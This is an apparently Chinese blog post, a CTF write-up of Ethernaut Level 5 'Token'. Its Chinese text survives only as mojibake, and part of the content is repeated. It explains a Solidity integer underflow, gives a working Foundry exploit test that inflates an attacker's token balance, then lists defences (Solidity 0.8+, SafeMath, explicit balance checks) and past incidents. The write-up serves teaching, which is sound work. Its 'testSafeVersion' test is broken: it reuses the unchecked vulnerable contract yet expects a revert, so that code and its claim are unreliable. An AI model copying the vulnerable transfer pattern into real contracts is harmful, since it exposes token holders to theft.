class=\"line\">uint balance = 20;</span><br><span class=\"line\">uint transferAmount = 21;</span><br><span class=\"line\"></span><br><span class=\"line\">// ä¸‹æº¢è®¡ç®—ï¼š20 - 21 = 2^256 - 1 (å·¨å¤§çš„æ­£æ•°)</span><br><span class=\"line\">uint result = balance - transferAmount;</span><br><span class=\"line\">// result = 115792089237316195423570985008687907853269984665640564039457584007913129639935</span><br><span class=\"line\"></span><br><span class=\"line\">// require æ£€æŸ¥ï¼šå·¨å¤§çš„æ­£æ•° &gt;= 0ï¼Œæ€»æ˜¯ä¸ºçœŸ</span><br><span class=\"line\">require(result &gt;= 0); // âœ… é€šè¿‡æ£€æŸ¥</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»æµ‹è¯•ä»£ç \"><a href=\"#æ”»å‡»æµ‹è¯•ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»æµ‹è¯•ä»£ç \"></a>æ”»å‡»æµ‹è¯•ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// å¤åˆ¶åŸå§‹æœ‰æ¼æ´çš„åˆçº¦ (ä½¿ç”¨ 0.6.0 ç‰ˆæœ¬è¡Œä¸º)</span><br><span class=\"line\">contract VulnerableToken &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public balances;</span><br><span class=\"line\">    uint public totalSupply;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(uint _initialSupply) &#123;</span><br><span class=\"line\">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class=\"line\">        // æ•…æ„ä½¿ç”¨ä¸å®‰å…¨çš„ç®—æœ¯è¿ç®—</span><br><span class=\"line\">        unchecked &#123;</span><br><span class=\"line\">            require(balances[msg.sender] - _value &gt;= 0);</span><br><span class=\"line\">            balances[msg.sender] -= _value;</span><br><span class=\"line\">            balances[_to] += _value;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class=\"line\">        return balances[_owner];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract TokenTest is Test &#123;</span><br><span class=\"line\">    VulnerableToken public token;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\">    address public victim = makeAddr(&quot;victim&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // éƒ¨ç½²ä»£å¸åˆçº¦ï¼Œåˆå§‹ä¾›åº”é‡ 1000</span><br><span class=\"line\">        token = new VulnerableToken(1000);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ç»™æ”»å‡»è€… 20 ä¸ªä»£å¸</span><br><span class=\"line\">        token.transfer(attacker, 20);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testTokenUnderflowExploit() public &#123;</span><br><span class=\"line\">        console.log(&quot;=== æ”»å‡»å‰çŠ¶æ€ ===&quot;);</span><br><span class=\"line\">        console.log(&quot;æ”»å‡»è€…ä½™é¢:&quot;, token.balanceOf(attacker));</span><br><span class=\"line\">        console.log(&quot;å—å®³è€…ä½™é¢:&quot;, token.balanceOf(victim));</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ğŸ¯ å…³é”®æ”»å‡»ï¼šè½¬è´¦è¶…è¿‡ä½™é¢çš„ä»£å¸</span><br><span class=\"line\">        uint256 transferAmount = 21; // å¤§äº 20 çš„ä½™é¢</span><br><span class=\"line\">        token.transfer(victim, transferAmount);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== æ”»å‡»åçŠ¶æ€ ===&quot;);</span><br><span class=\"line\">        console.log(&quot;æ”»å‡»è€…ä½™é¢:&quot;, token.balanceOf(attacker));</span><br><span class=\"line\">        console.log(&quot;å—å®³è€…ä½™é¢:&quot;, token.balanceOf(victim));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯ä¸‹æº¢æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertGt(token.balanceOf(attacker), 1000000); // æ”»å‡»è€…è·å¾—å·¨é¢ä»£å¸</span><br><span class=\"line\">        assertEq(token.balanceOf(victim), transferAmount);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testUnderflowMath() public view &#123;</span><br><span class=\"line\">        // æ¼”ç¤ºä¸‹æº¢è®¡ç®—</span><br><span class=\"line\">        uint256 balance = 20;</span><br><span class=\"line\">        uint256 transferAmount = 21;</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== ä¸‹æº¢è®¡ç®—æ¼”ç¤º ===&quot;);</span><br><span class=\"line\">        console.log(&quot;åŸå§‹ä½™é¢:&quot;, balance);</span><br><span class=\"line\">        console.log(&quot;è½¬è´¦é‡‘é¢:&quot;, transferAmount);</span><br><span class=\"line\">        </span><br><span class=\"line\">        unchecked &#123;</span><br><span class=\"line\">            uint256 result = balance - transferAmount;</span><br><span class=\"line\">            console.log(&quot;ä¸‹æº¢ç»“æœ:&quot;, result);</span><br><span class=\"line\">            console.log(&quot;æœ€å¤§ uint256:&quot;, type(uint256).max);</span><br><span class=\"line\">            console.log(&quot;æ˜¯å¦ç›¸ç­‰:&quot;, result == type(uint256).max);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testSafeVersion() public &#123;</span><br><span class=\"line\">        // æ¼”ç¤ºå®‰å…¨ç‰ˆæœ¬</span><br><span class=\"line\">        VulnerableToken safeToken = new VulnerableToken(1000);</span><br><span class=\"line\">        safeToken.transfer(attacker, 20);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // åœ¨ Solidity 0.8.0+ ä¸­ï¼Œè¿™ä¼š revert</span><br><span class=\"line\">        vm.expectRevert(); // æœŸæœ›äº¤æ˜“å¤±è´¥</span><br><span class=\"line\">        safeToken.transfer(victim, 21); // è¿™åœ¨æ–°ç‰ˆæœ¬ä¸­ä¼šå¤±è´¥</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"è¿è¡Œæµ‹è¯•\"><a href=\"#è¿è¡Œæµ‹è¯•\" class=\"headerlink\" title=\"è¿è¡Œæµ‹è¯•\"></a>è¿è¡Œæµ‹è¯•</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract TokenTest -vvv</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"1-ä½¿ç”¨-Solidity-0-8-0\"><a href=\"#1-ä½¿ç”¨-Solidity-0-8-0\" class=\"headerlink\" title=\"1. ä½¿ç”¨ Solidity 0.8.0+\"></a>1. ä½¿ç”¨ Solidity 0.8.0+</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SafeToken &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint256) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class=\"line\">        // Solidity 0.8.0+ è‡ªåŠ¨æ£€æŸ¥æº¢å‡º</span><br><span class=\"line\">        balances[msg.sender] -= _value; // è‡ªåŠ¨ revert å¦‚æœä¸‹æº¢</span><br><span class=\"line\">        balances[_to] += _value;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-ä½¿ç”¨-SafeMath-åº“-æ—§ç‰ˆæœ¬\"><a href=\"#2-ä½¿ç”¨-SafeMath-åº“-æ—§ç‰ˆæœ¬\" class=\"headerlink\" title=\"2. ä½¿ç”¨ SafeMath åº“ (æ—§ç‰ˆæœ¬)\"></a>2. ä½¿ç”¨ SafeMath åº“ (æ—§ç‰ˆæœ¬)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.6.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;@openzeppelin/contracts/math/SafeMath.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SafeTokenV6 &#123;</span><br><span class=\"line\">    using SafeMath for uint256;</span><br><span class=\"line\">    </span><br><span class=\"line\">    mapping(address =&gt; uint256) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class=\"line\">        balances[msg.sender] = balances[msg.sender].sub(_value); // å®‰å…¨å‡æ³•</span><br><span class=\"line\">        balances[_to] = balances[_to].add(_value); // å®‰å…¨åŠ æ³•</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-æ˜¾å¼æ£€æŸ¥\"><a href=\"#3-æ˜¾å¼æ£€æŸ¥\" class=\"headerlink\" title=\"3. æ˜¾å¼æ£€æŸ¥\"></a>3. æ˜¾å¼æ£€æŸ¥</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract ExplicitCheckToken &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint256) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class=\"line\">        require(balances[msg.sender] &gt;= _value, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        balances[msg.sender] -= _value;</span><br><span class=\"line\">        balances[_to] += _value;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\"><a href=\"#ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\" class=\"headerlink\" title=\"ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\"></a>ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹</h2><h3 id=\"æ•´æ•°æº¢å‡ºç±»å‹\"><a href=\"#æ•´æ•°æº¢å‡ºç±»å‹\" class=\"headerlink\" title=\"æ•´æ•°æº¢å‡ºç±»å‹\"></a>æ•´æ•°æº¢å‡ºç±»å‹</h3><table>\n<thead>\n<tr>\n<th>ç±»å‹</th>\n<th>æè¿°</th>\n<th>ç¤ºä¾‹</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>ä¸Šæº¢</strong></td>\n<td>è¶…è¿‡æœ€å¤§å€¼</td>\n<td><code>type(uint256).max + 1 = 0</code></td>\n</tr>\n<tr>\n<td><strong>ä¸‹æº¢</strong></td>\n<td>ä½äºæœ€å°å€¼</td>\n<td><code>0 - 1 = type(uint256).max</code></td>\n</tr>\n</tbody></table>\n<h3 id=\"Solidity-ç‰ˆæœ¬å¯¹æ¯”\"><a href=\"#Solidity-ç‰ˆæœ¬å¯¹æ¯”\" class=\"headerlink\" title=\"Solidity ç‰ˆæœ¬å¯¹æ¯”\"></a>Solidity ç‰ˆæœ¬å¯¹æ¯”</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// Solidity 0.7.x åŠä»¥ä¸‹</span><br><span class=\"line\">function unsafeAdd(uint a, uint b) public pure returns (uint) &#123;</span><br><span class=\"line\">    return a + b; // å¯èƒ½æº¢å‡ºï¼Œæ— è‡ªåŠ¨æ£€æŸ¥</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// Solidity 0.8.0+</span><br><span class=\"line\">function safeAdd(uint a, uint b) public pure returns (uint) &#123;</span><br><span class=\"line\">    return a + b; // è‡ªåŠ¨æ£€æŸ¥æº¢å‡ºï¼Œæº¢å‡ºæ—¶ revert</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// æ˜¾å¼ä¸å®‰å…¨æ“ä½œ (0.8.0+)</span><br><span class=\"line\">function explicitUnsafe(uint a, uint b) public pure returns (uint) &#123;</span><br><span class=\"line\">    unchecked &#123;</span><br><span class=\"line\">        return a + b; // æ˜¾å¼è·³è¿‡æº¢å‡ºæ£€æŸ¥</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å®‰å…¨æ•°å­¦è¿ç®—\"><a href=\"#å®‰å…¨æ•°å­¦è¿ç®—\" class=\"headerlink\" title=\"å®‰å…¨æ•°å­¦è¿ç®—\"></a>å®‰å…¨æ•°å­¦è¿ç®—</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âœ… å®‰å…¨çš„ä½™é¢æ£€æŸ¥</span><br><span class=\"line\">function safeTransfer(address _to, uint256 _value) public &#123;</span><br><span class=\"line\">    require(balances[msg.sender] &gt;= _value, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    balances[msg.sender] -= _value;</span><br><span class=\"line\">    balances[_to] += _value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// âœ… ä½¿ç”¨ SafeMath (æ—§ç‰ˆæœ¬)</span><br><span class=\"line\">function safeTransferLegacy(address _to, uint256 _value) public &#123;</span><br><span class=\"line\">    balances[msg.sender] = balances[msg.sender].sub(_value);</span><br><span class=\"line\">    balances[_to] = balances[_to].add(_value);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›ï¸-å†å²æ¡ˆä¾‹\"><a href=\"#ğŸ›ï¸-å†å²æ¡ˆä¾‹\" class=\"headerlink\" title=\"ğŸ›ï¸ å†å²æ¡ˆä¾‹\"></a>ğŸ›ï¸ å†å²æ¡ˆä¾‹</h2><h3 id=\"è‘—åçš„æ•´æ•°æº¢å‡ºæ”»å‡»\"><a href=\"#è‘—åçš„æ•´æ•°æº¢å‡ºæ”»å‡»\" class=\"headerlink\" title=\"è‘—åçš„æ•´æ•°æº¢å‡ºæ”»å‡»\"></a>è‘—åçš„æ•´æ•°æº¢å‡ºæ”»å‡»</h3><ol>\n<li><p><strong>PoWHCoin</strong> (2018)</p>\n<ul>\n<li>æ”»å‡»è€…åˆ©ç”¨æ•´æ•°æº¢å‡ºè·å¾—å·¨é¢ä»£å¸</li>\n<li>å¯¼è‡´é¡¹ç›®å®Œå…¨å´©æºƒ</li>\n</ul>\n</li>\n<li><p><strong>BeautyChain (BEC)</strong> (2018)</p>\n<ul>\n<li>BatchOverFlow æ¼æ´</li>\n<li>é€ æˆä»£å¸ä»·å€¼å½’é›¶</li>\n</ul>\n</li>\n<li><p><strong>SMT Token</strong> (2018)</p>\n<ul>\n<li>ç±»ä¼¼çš„æ‰¹é‡è½¬è´¦æº¢å‡ºæ¼æ´</li>\n<li>äº¤æ˜“æ‰€æš‚åœäº¤æ˜“</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p>Token å…³å¡æ­ç¤ºäº†æ—©æœŸ Solidity çš„é‡è¦å®‰å…¨éšæ‚£ï¼š</p>\n<ul>\n<li>âœ… <strong>æ•´æ•°æº¢å‡ºçš„ä¸¥é‡åæœ</strong> - å¯ä»¥å®Œå…¨ç ´åä»£å¸ç»æµå­¦</li>\n<li>âœ… <strong>ç‰ˆæœ¬å‡çº§çš„é‡è¦æ€§</strong> - Solidity 0.8.0+ æä¾›å†…ç½®ä¿æŠ¤</li>\n<li>âœ… <strong>SafeMath çš„å†å²ä»·å€¼</strong> - åœ¨æ—§ç‰ˆæœ¬ä¸­æä¾›å®‰å…¨ä¿æŠ¤</li>\n<li>âœ… <strong>æ˜¾å¼æ£€æŸ¥çš„å¿…è¦æ€§</strong> - æ€»æ˜¯éªŒè¯å…³é”®å‡è®¾</li>\n</ul>\n<p>è¿™ä¸ªçœ‹ä¼¼ç®€å•çš„ç®—æœ¯é”™è¯¯ï¼Œå®é™…ä¸Šå½±å“äº†æ— æ•° DeFi é¡¹ç›®çš„å®‰å…¨æ€§è®¾è®¡ã€‚</p>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-04-telephone/\">ä¸Šä¸€å…³: Level 4 - Telephone</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-06-delegation/\">ä¸‹ä¸€å…³: Level 6 - Delegation</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://docs.openzeppelin.com/contracts/2.x/api/math\">OpenZeppelin SafeMath</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®</a></strong></li>\n</ul>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-5-Token-æ•´æ•°ä¸‹æº¢æ”»å‡»è¯¦è§£\"><a href=\"#ğŸ¯-Ethernaut-Level-5-Token-æ•´æ•°ä¸‹æº¢æ”»å‡»è¯¦è§£\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 5: Token - æ•´æ•°ä¸‹æº¢æ”»å‡»è¯¦è§£\"></a>ğŸ¯ Ethernaut Level 5: Token - æ•´æ•°ä¸‹æº¢æ”»å‡»è¯¦è§£</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/5\">Ethernaut Level 5 - Token</a><br><strong>æ”»å‡»ç±»å‹</strong>: æ•´æ•°ä¸‹æº¢æ”»å‡»<br><strong>éš¾åº¦</strong>: â­â­â­â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><ol>\n<li><strong>è·å¾—å¤§é‡ä»£å¸</strong> - ä»åˆå§‹çš„ 20 ä¸ªä»£å¸å¢åŠ åˆ°å¤§é‡ä»£å¸</li>\n<li><strong>ç†è§£æ•´æ•°æº¢å‡º</strong> - æŒæ¡ç®—æœ¯è¿ç®—çš„å®‰å…¨é—®é¢˜</li>\n</ol>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"åˆçº¦æºç åˆ†æ\"><a href=\"#åˆçº¦æºç åˆ†æ\" class=\"headerlink\" title=\"åˆçº¦æºç åˆ†æ\"></a>åˆçº¦æºç åˆ†æ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.6.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Token &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) balances;</span><br><span class=\"line\">    uint public totalSupply;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(uint _initialSupply) public &#123;</span><br><span class=\"line\">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class=\"line\">        // ğŸš¨ æ¼æ´ï¼šæ²¡æœ‰æ£€æŸ¥ä¸‹æº¢å‡º</span><br><span class=\"line\">        require(balances[msg.sender] - _value &gt;= 0);</span><br><span class=\"line\">        balances[msg.sender] -= _value;</span><br><span class=\"line\">        balances[_to] += _value;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class=\"line\">        return balances[_owner];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ¼æ´è¯†åˆ«\"><a href=\"#æ¼æ´è¯†åˆ«\" class=\"headerlink\" title=\"æ¼æ´è¯†åˆ«\"></a>æ¼æ´è¯†åˆ«</h3><p><strong>æ•´æ•°ä¸‹æº¢é—®é¢˜</strong>ï¼š</p>\n<ol>\n<li><strong>æ— ç¬¦å·æ•´æ•°ç‰¹æ€§</strong> - <code>uint</code> ç±»å‹ä¸èƒ½ä¸ºè´Ÿæ•°</li>\n<li><strong>ä¸‹æº¢è¡Œä¸º</strong> - å½“ <code>0 - 1</code> æ—¶ï¼Œç»“æœå˜æˆ <code>2^256 - 1</code></li>\n<li><strong>æ£€æŸ¥å¤±æ•ˆ</strong> - <code>require(balances[msg.sender] - _value &gt;= 0)</code> æ€»æ˜¯ä¸ºçœŸ</li>\n</ol>\n<h3 id=\"æ”»å‡»åŸç†\"><a href=\"#æ”»å‡»åŸç†\" class=\"headerlink\" title=\"æ”»å‡»åŸç†\"></a>æ”»å‡»åŸç†</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// å‡è®¾ç”¨æˆ·ä½™é¢ä¸º 20</span><br><span class=\"line\">uint balance = 20;</span><br><span class=\"line\">uint transferAmount = 21;</span><br><span class=\"line\"></span><br><span class=\"line\">// ä¸‹æº¢è®¡ç®—ï¼š20 - 21 = 2^256 - 1 (å·¨å¤§çš„æ­£æ•°)</span><br><span class=\"line\">uint result = balance - transferAmount;</span><br><span class=\"line\">// result = 115792089237316195423570985008687907853269984665640564039457584007913129639935</span><br><span class=\"line\"></span><br><span class=\"line\">// require æ£€æŸ¥ï¼šå·¨å¤§çš„æ­£æ•° &gt;= 0ï¼Œæ€»æ˜¯ä¸ºçœŸ</span><br><span class=\"line\">require(result &gt;= 0); // âœ… é€šè¿‡æ£€æŸ¥</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a 